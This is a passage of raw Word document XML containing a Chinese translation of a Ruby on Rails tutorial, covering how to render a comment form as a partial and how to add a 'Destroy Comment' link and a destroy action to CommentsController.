          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>分配每个 comment 为与 partial 名相同的本地变量</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">（这里为comment），通过这样在 partial 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comment</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就可以显示给我们的用户了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D97064"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 xml:space="preserve">11.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Rendering a Partial Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB97F59"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同样让我们移动 new comment 部分到它自己的地方吧。类似的，创建一个文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/comments/_form.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且在里面放入下面代码：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6576"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="47670A8B" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19575D1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form_for([@post, @post.comments.build]) do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4799FF9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79EEEFF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f.label :commenter</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5E79963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f.text_field :commenter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7984F65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7CEAC46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557CFC1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f.label :body</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36DF7DA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f.text_area :body</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36E5641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193C8A3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class="actions"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="428F0FA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f.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0557A7C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0ECC1C5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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="570C5C6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接着你这样修改 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6336"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6C64C7B6" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1041901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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="notice"&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>notice %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E41B6C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7A0E6DE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169BF15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&lt;b&gt;Name:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7785908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@post.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A07998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70990F3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3AEA1FB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42CF0B2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&lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BEB3A4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@post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A26586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1C1964B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153AAF4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07622F7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&lt;b&gt;Content:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CC40D2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@post.content %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68393CA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76D7AD7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4B26012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&lt;h2&gt;Comments&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C05F548" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render @post.comments %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B9F77A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0FBE8A8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&lt;h2&gt;Add a comment:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BD61C3D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render "comments/form"</w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="000621E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064FA1A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37F8DAA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60EA455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'Edit Post', edit_post_path(@post) %&gt;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16739D4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'Back to Posts', posts_path %&gt;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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="714E900B"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9522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>第二个 render 仅仅定义了一个我们想渲染的 partial template</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comments/form</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，Rails 可以智能的识别字符串代表的含义，并且知道你是想 render </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_form.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">模板在目录 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF8EACF"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rPr>
        <w:t>@post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以在任何的视图中partials rendered，因为我们把它定义成的实例变量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0154E7F0"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12 Deleting Comments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3152827C"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另一个重要的功能就是可以删除垃圾评论。要达到这样的效果，我们需要在view中实现某种链接和在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CommentsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45648D8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首先，在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/comments/_comment.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> partial中添加delete link：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="04D8FF95" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D96B8D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5A3E003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&lt;b&gt;Commenter:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="179A742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comment.commenter %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B67BF6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7626E98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4DDA87D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539AE14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&lt;b&gt;Comment:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77C06EC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comment.body %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C65AA6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5347AFA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002A58E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73A1A1C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'Destroy Comment', [comment.post, comment],</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AC960C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:confirm</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Are you sure?',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A91E38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:method</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :delete</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09D3290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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="13D1A00B"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点击 “Destroy Comment”，link 将会发送 DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> /posts/:id/comments/:id</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 到我们的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CommentsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CommentsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将会利用刚刚收到的（消息）找到我们想删除哪条评论，因此让我们接着添加一个 destroy action 到我们的 controller：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7176"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="40CCA061" w14:textId="77777777" w:rsidTr="00253192">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BF5803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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>CommentsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44449CF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17477C0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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C6E553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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:post_id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FC7E0B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@comment</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= @post.comments.create(params[:comment])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5203CB9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redirect_to post_path(@post)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76A6C2F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7692466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64A40B7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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04591F5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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:post_id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A14F6A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@comment</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= @post.comments.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4147EDB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@comment.destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F76648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redirect_to post_path(@post)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BFBAF5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end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01817E4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5FD6717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0531719F"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rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action 将会找到那个我们正在阅读的 post，并且定位 comment 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
